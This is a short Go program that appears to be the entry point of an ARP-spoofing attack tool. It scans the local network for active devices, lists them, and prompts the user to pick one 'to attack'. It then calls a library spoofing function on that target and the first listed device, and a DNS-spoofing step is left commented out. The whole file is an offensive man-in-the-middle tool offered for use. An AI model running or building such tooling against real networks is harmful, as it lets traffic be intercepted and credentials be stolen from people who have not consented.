package main

import (
	"fmt"
	"log"

	hdisc "github.com/KennyZ69/HdiscLib"
	"github.com/KennyZ69/arpoof"
)

func main() {
	devices, err := hdisc.ARPScan()
	if err != nil || len(devices) < 1 {
		log.Fatalf("Error arp scanning for active devices: %s\n", err)
	}

	// printing out the devices to let the user choose
	for i, dev := range devices {
		fmt.Printf("N.%d: %-15s %-17s %-30s %-10s\n", i+1, dev.IP.String(), dev.Mac.String(), "", dev.Manuf)
	}

	idx, err := selectDev()
	if err != nil || idx < 1 || idx > len(devices) {
		log.Fatalf("Error selecting a device, please provide one number of the chosen device from list\n")
	}

	targetDev := devices[idx-1] // -1 because I am printing from 1 but it is 0 indexing language of course

	arpoof.Spoof(targetDev, devices[0])

	// arpoof.DNSpoof()
}

// returns the index (i + 1) of a device the user chose and possible error
func selectDev() (int, error) {
	var idx int
	fmt.Printf("\nPlease choose one of the provided devices to attack: \n")
	_, err := fmt.Scanf("%d", &idx)
	return idx, err
}
